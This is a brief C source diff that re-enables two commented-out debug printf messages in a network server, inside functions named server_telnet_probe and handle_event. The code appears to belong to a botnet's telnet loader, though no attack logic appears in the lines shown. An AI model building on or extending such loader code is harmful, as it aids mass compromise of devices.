@@ -113,7 +113,7 @@ void server_telnet_probe(struct server *srv, struct telnet_info *info)
     {
         if (time(NULL) % 10 == 0)
         {
-            //printf("Failed to open and bind socket\n");
+            printf("Failed to open and bind socket\n");
         }
         ATOMIC_DEC(&srv->curr_open);
         return;
@@ -564,7 +564,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                     if (consumed > conn->rdbuf_pos)
                     {
                         consumed = conn->rdbuf_pos;
-                        //printf("consuming more then our position!\n");
+                        printf("consuming more then our position!\n");
                         //abort();
                     }
                     conn->rdbuf_pos -= consumed;
